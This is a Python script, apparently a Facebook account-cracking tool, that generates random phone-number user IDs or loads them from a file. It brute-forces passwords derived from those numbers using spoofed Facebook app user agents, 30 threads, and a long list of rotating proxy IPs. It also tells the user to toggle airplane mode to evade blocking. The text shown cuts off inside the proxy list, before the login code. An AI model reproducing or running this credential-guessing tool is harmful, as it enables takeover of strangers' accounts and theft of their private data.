#_________[ IMPORTING MODULES ]______>>
import os,requests,json,time
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#__________[ EMPITY LOOP / LIST ]_______>>
oks = []
user_ID = []
cps = []
cracked = []
pwx = []
ualist = []
def ua_api():
    vers = random.randrange(6,13)
    verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
    xnxx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U'])
    return (f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]")
#_______[ BASIC COLORS ]_____>>
white = '\033[1;37m'
rad = '\033[1;31m'
green = '\033[1;32m'
yellow  = "\033[0;33m"
#_________[ LOGO ]______>>>
def logo():
    os.system("clear")
    print(f"""{white}

      
 ██████╗░░█████╗░██████╗░██╗░░██╗  ███████╗
 ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝  ╚════██║
 ██║░░██║███████║██████╔╝█████═╝░  ░░███╔═╝
 ██║░░██║██╔══██║██╔══██╗██╔═██╗░  ██╔══╝░░
 ██████╔╝██║░░██║██║░░██║██║░╚██╗  ███████╗
 ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝  ╚══════╝  {green}(DARK){white}  """)                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : DARK Z ")
    print(f" {white}{green}[~]{white} Tool      : ONLY-GREEN [PRO] ")
    print(f" {white}{green}[~]{white} Github    : https://github.com/coderet-d-looper ")
    print(f" {white}{green}[~]{white} Status    : {green}Premium [Free] ")
    print(f" {white}{green}[~]{white} Version   : 1.0 ")
    print(50*'-')
#_________[ USER-AGENT LIST GENERATER ]______>>>
for i in range(10000):
    fbs = 'com.facebook.katana'
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code = str(random.randint(000000000,999999999))
    android_version = str(random.randrange(5,15))
    dens = str(random.randrange(0,5))
    xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4', 'vivaltods5m',])
    try:
        ualist.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
    except IndexError:
        pass
#______[MAIN MENU]__________>>
def infinty():
    logo()
    os.system('xdg-open https://chat.whatsapp.com/+8801576593082')
    print(f'{rad} USE PREMIUM TOOL FREE {white} ')
    print(50*'-')
    print(f'{white}{green} [1]{white} Random Crack[PRO]')
    print(f'{white}{green} [2]{white} File Crack')
    print(f'{white}{green} [0]{white} Close Project')
    print(50*"-")
    EvilX = input(f'{white} [{rad}?{white}] Select Code : {green}')
    if EvilX in ['1','01']:
        random_number()
    elif EvilX in ['2','02']:
        file_crack()
    elif EvilX in ['0','00']:
        exit()
    else:
        print(f'{white}[{green}℅{white}] select one option ')
#______[ RANDOM NUMBER CRACK ]______>>
def random_number():
    logo()
    code = input(f"[{green}+{white}] Input Number Code : ")
    try:
        limit = int(input(f"[{green}+{white}] Input Limit Crack : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    pwx = ['fisrt6digit', 'first7digit', 'first8digit', 'first9digit', 'first10digit', 'last6digit', 'last7digit', 'last8digit', 'last9digit', 'last10digit', 'fullnumber', '102030', '203040', '304050', '405060', '506070', '607080', '708090']
    with ThreadPool(max_workers=30) as BilalHaiderID:
        total = str(len(user_ID))
        logo()
        print(f" {green}[*]{white} Total UID for Crack : {total}")
        print(f" {green}[*]{white} Total Password for Crack : {str(len(pwx))}")
        print(f" {green}[*]{white} Code for UID Dump : {str(code)}")
        print(50*'-')
        for user in user_ID:
            uid = code+user
            BilalHaiderID.submit(bapi,uid,pwx,total)
    print(50*"-")
    print(f"\n{white}[{green}•{white}] process Has been Completed")
    print(f"{white}[{green}•{white}] Total Ids : {len(oks)} ")
#___________[ FILE CLONING OLD / NEW ]__________>>
def file_crack():
    logo()
    fileX = input(f"[{green}+{white}] Input File Path : ")
    try:
        file_data = open(fileX,"r").read()
    except FileNotFoundError:
        exit(f"\n{rad} file not found ... ")
    except PermissionError:
        exit(f"\n{rad} allow the permission ... ")
    try:
        limit = int(input(f"\n[{green}+{white}] Input Password Limit : "))
        if limit > 15:
            limit = 15
    except ValueError:
        limit = 15
    logo()
    print(f" {green}[*]{white}  example : first last - firstlast")
    print(f" {green}[*]{white}  example : first123 - last1234")
    print(f" {green}[*]{white}  example : firstlast123 - 786786 - Bangladesh")
    print(50*'-')
    for i in range(limit):
        password = input(f"[{green}+{white}] Input Password {str(i+1)} : ")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=30) as BilalHaiderID:
        total = str(len(file_data.splitlines()))
        logo()
        print(f" {green}[*]{white}  Total IDz for Crack : {total}")
        print(f" {green}[*]{white}  Total Password for Crack : {str(len(pwx))}")
        print(f" {green}[*]{white}  File Path : {fileX}")
        print(f" {green}[*]{rad}    USE AIRPLANE MODE IN EVERY 5MIN ")
        print(50*'-')
        uidX = file_data.splitlines()
        for uid in uidX:
            BilalHaiderID.submit(bapif,uid,pwx,total)
    print(50*"-")
    print(f"\n{white}[{green}•{white}] The process Has been Completed")
    print(f"{white}[{green}•{white}] Total Ids : {len(oks)} ")
#___________[ B-API CRACK ]________>>
def bapi(uid,pwx,total):
    global oks,cps
    global ualist
    global cracked
    try:
        last7digit = uid[int(len(uid))-7:]
        last6digit = uid[int(len(uid))-6:]
        last8digit = uid[int(len(uid))-8:]
        last9digit = uid[int(len(uid))-9:]
        last10digit = uid[int(len(uid))-10:]
        first6digit = uid[0:6]
        first7digit = uid[0:7]
        first8digit = uid[0:8]
        first9digit = uid[0:9]
        first10digit = uid[0:10]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}SEARCHING{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("last7digit",last7digit)
            pw = pw.replace("last6digit",last6digit)
            pw = pw.replace("last8digit",last8digit)
            pw = pw.replace("last9digit",last9digit)
            pw = pw.replace("last10digit",last10digit)
            pw = pw.replace("first6digit",first6digit)
            pw = pw.replace("first6digit",first6digit)
            pw = pw.replace("first7digit",first7digit)
            pw = pw.replace("first8digit",first8digit)
            pw = pw.replace("first9digit",first9digit)
            pw = pw.replace("first10digit",first10digit)
            pw = pw.replace("fullnumber",fullnumber)
            useragent = str(ua_api())
            proxy = [
'142.54.226.214:4145',
'72.210.252.137:4145',
'74.119.147.209:4145',
'208.102.51.6:58208',
'142.54.239.1:4145',
'98.162.25.16:4145',
'142.54.229.249:4145',
'67.201.33.10:25283',
'184.178.172.26:4145',
'72.221.232.155:4145',
'192.111.135.18:18301',
'199.102.106.94:4145',
'184.178.172.25:15291',
'192.111.137.35:4145',
'107.181.168.145:4145',
'192.111.139.163:19404',
'184.170.249.65:4145',
'68.71.247.130:4145',
'192.252.209.155:14455',
'192.252.211.197:14921',
'98.181.137.80:4145',
'24.249.199.12:4145',
'192.111.139.162:4145',
'98.162.25.23:4145',
'199.102.107.145:4145',
'174.64.199.79:4145',
'192.111.129.145:16894',
'221.11.60.110:5138',
'98.178.72.21:10919',
'142.54.236.97:4145',
'198.8.94.170:4145',
'192.111.137.37:18762',
'72.210.221.197:4145',
'92.205.107.238:5145',
'142.54.232.6:4145',
'195.168.10.9:58530',
'72.206.181.123:4145',
'184.178.172.28:15294',
'107.181.161.81:4145',
'213.202.254.179:56713',
'192.252.214.20:15864',
'98.181.137.83:4145',
'98.162.25.7:31653',
'72.221.172.203:4145',
'72.37.217.3:4145',
'199.58.184.97:4145',
'184.178.172.5:15303',
'192.252.208.67:14287',
'184.181.217.210:4145',
'104.37.135.145:4145',
'192.111.139.165:4145',
'72.195.34.41:4145',
'46.101.99.250:23424',
'72.221.164.34:60671',
'161.35.117.30:19109',
'184.178.172.17:4145',
'69.61.200.104:36181',
'192.111.138.29:4145',
'72.206.181.97:64943',
'72.195.114.184:4145',
'98.162.25.29:31679',
'192.111.130.2:4145',
'142.54.231.38:4145',
'74.119.144.60:4145',
'187.62.89.252:4153',
'72.195.34.59:4145',
'80.63.107.90:4153',
'192.111.137.34:18765',
'72.37.216.68:4145',
'72.206.181.103:4145',
'184.181.217.206:4145',
'184.170.248.5:4145',
'184.178.172.14:4145',
'184.181.217.220:4145',
'72.221.171.135:4145',
'184.178.172.3:4145',
'72.210.252.134:46164',
'184.178.172.23:4145',
'66.42.224.229:41679',
'74.57.41.242:4153',
'72.221.232.152:4145',
'184.181.217.213:4145',
'192.111.130.5:17002',
'184.178.172.11:4145',
'98.162.96.41:4145',
'98.188.47.132:4145',
'184.185.2.12:4145',
'130.193.123.34:5678',
'192.111.135.17:18302',
'184.181.217.194:4145',
'184.178.172.18:15280',
'72.210.221.223:4145',
'144.76.99.207:16004',
'72.221.196.157:35904',
'72.217.216.239:4145',
'98.170.57.249:4145',
'120.79.34.201:9443',
'1.12.223.26:7890',
'68.71.254.6:4145',
'205.240.77.164:4145',
'68.71.249.153:48606',
'72.195.34.42:4145',
'184.181.217.201:4145',
'178.48.68.61:4145',
'115.242.204.122:5678',
'210.245.51.76:4145',
'139.196.214.238:8024',
'103.234.27.164:1080',
'46.229.55.37:9050',
'1.2.169.39:50832',
'95.128.142.76:1080',
'105.234.148.210:35010',
'190.57.131.158:1080',
'197.156.243.134:33333',
'45.118.218.196:35010',
'104.164.183.173:3128',
'114.226.31.226:1080',
'141.94.254.138:49207',
'45.190.141.241:1080',
'124.158.182.34:10808',
'228.231.104.101:80',
'186.103.143.213:4153',
'117.74.125.49:1133',
'24.249.199.4:4145',
'177.66.43.189:4145',
'190.103.84.11:32767',
'61.184.189.124:10800',
'72.221.171.130:4145',
'103.38.103.18:1080',
'103.124.139.178:4145',
'67.225.243.221:63536',
'46.148.36.47:4153',
'153.127.248.65:8080',
'50.238.47.86:32100',
'67.227.213.99:56510',
'193.200.151.69:32777',
'184.170.245.148:4145',
'103.83.252.61:1080',
'31.170.19.241:4153',
'94.20.21.9:4153',
'8.39.228.21:39593',
'170.254.244.107:35010',
'220.247.225.132:8080',
'120.79.34.201:9992',
'181.191.39.29:5678',
'1.9.213.114:4153',
'103.146.184.19:1085',
'43.239.75.102:4145',
'200.32.105.86:4153',
'45.32.94.106:11968',
'45.32.89.242:11808',
'103.160.17.38:5678',
'200.109.66.90:4153',
'111.255.251.59:3129',
'149.28.247.196:10400',
'170.81.108.45:4153',
'103.156.141.100:8010',
'27.118.21.13:5678',
'71.40.17.29:33651',
'66.29.129.54:21925',
'115.127.87.62:1088',
'115.127.75.154:1088',
'103.93.100.78:32000',
'103.48.183.113:4145',
'103.138.22.165:32000',
'190.119.167.154:5678',
'104.200.135.46:4145',
'103.91.95.2:32767',
'119.46.2.250:4145',
'103.134.113.247:32767',
'114.103.88.116:8089',
'110.44.171.10:57775',
'95.170.202.197:58744',
'46.172.75.51:5678',
'41.58.169.214:5678',
'190.186.216.196:5678',
'103.235.199.100:25566',
'58.143.65.69:22569',
'125.126.213.4:38801',
'197.234.58.102:57775',
'45.117.228.81:4145',
'186.145.192.251:5678',
'109.94.178.238:3629',
'103.250.153.202:41889',
'46.105.105.223:45443',
'138.122.74.55:57775',
'200.60.71.12:46934',
'103.167.172.104:57775',
'183.111.165.166:14',
'159.65.9.135:10277',
'146.196.121.29:57775',
'47.109.46.223:8090',
'117.74.65.29:8012',
'142.54.235.9:4145',
'107.152.98.5:4145',
'103.79.165.164:57775',
'193.106.192.50:36387',
'154.0.155.205:8080',
'202.154.18.115:1080',
'177.234.244.170:32213',
'72.49.49.11:31034',
'103.168.233.91:25566',
'103.149.104.161:4153',
'170.254.148.110:8080',
'159.138.255.141:9981',
'79.122.244.99:3128',
'49.70.89.82:9999',
'95.158.174.111:1080',
'103.18.232.47:80',
'202.57.37.197:35846',
'43.229.73.239:41862',
'41.190.152.130:4673',
'79.173.75.182:3629',
'41.57.34.112:1080',
'110.78.149.70:4145',
'31.131.135.247:4153',
'5.133.96.148:4153',
'103.152.104.228:1080',
'80.250.18.225:25566',
'190.114.143.226:8080',
'117.198.221.34:4153',
'213.145.134.174:3629',
'177.38.245.106:55713',
'201.184.239.75:5678',
'103.230.62.146:12391',
'117.74.125.19:1313',
'194.85.135.243:4145',
'80.254.185.73:1080',
'93.104.63.65:80',
'165.0.15.182:5678',
'91.193.125.123:3629',
'117.74.120.61:1313',
'177.107.217.112:4145',
'24.172.34.114:60133',
'41.190.232.36:36926',
'117.220.162.33:5621',
'95.81.94.254:3128',
'103.176.96.116:5678',
'91.121.163.199:40148',
'94.154.21.65:1080',
'102.89.12.203:7599',
'119.18.146.139:4153',
'209.94.84.65:1080',
'103.207.170.131:5678',
'180.210.222.233:1080',
'142.54.236.97:4145',
'51.15.209.188:16379',
'190.182.88.214:30956',
'177.66.43.189:4145',
'51.79.50.31:9300',
'24.172.34.114:60133',
'199.58.185.9:4145',
'107.181.168.145:4145',
'103.152.104.228:1080',
'195.154.106.167:80',
'170.254.148.110:8080',
'66.42.224.229:41679',
'205.240.77.164:4145',
'183.111.165.166:14',
'184.170.249.65:4145',
'200.7.10.158:8080',
'125.126.213.4:38801',
'184.178.172.28:15294',
'93.41.142.213:8080',
'109.194.22.61:8080',
'202.166.206.59:5678',
'160.72.82.101:80',
'198.8.94.170:4145',
'72.221.164.34:60671',
'222.111.18.67:80',
'111.40.116.212:9091',
'177.93.45.154:999',
'31.131.135.247:4153',
'192.111.139.162:4145',
'75.89.101.62:80',
'47.74.152.29:8888',
'45.32.89.242:11808',
'185.244.208.193:37430',
'67.225.243.221:63536',
'159.224.243.185:61303',
'91.121.163.199:40148',
'117.158.146.215:9091',
'45.81.145.128:8080',
'72.221.172.203:4145',
'72.210.252.137:4145',
'47.109.46.223:8090',
'24.249.199.12:4145',
'103.231.78.36:80',
'202.149.89.70:7999',
'125.99.106.250:3128',
'192.252.208.67:14287',
'36.92.162.212:8080',
'217.11.184.30:3128',
'117.186.232.73:8081',
'72.210.221.223:4145',
'187.1.57.206:20183',
'98.178.72.21:10919',
'178.54.21.203:8081',
'123.231.230.58:31196',
'109.166.207.162:3629',
'115.127.75.154:1088',
'110.34.3.229:3128',
'144.76.32.106:60129',
'194.31.53.250:80',
'41.58.169.214:5678',
'223.123.100.138:8080',
'114.112.34.54:8080',
'72.37.217.3:4145',
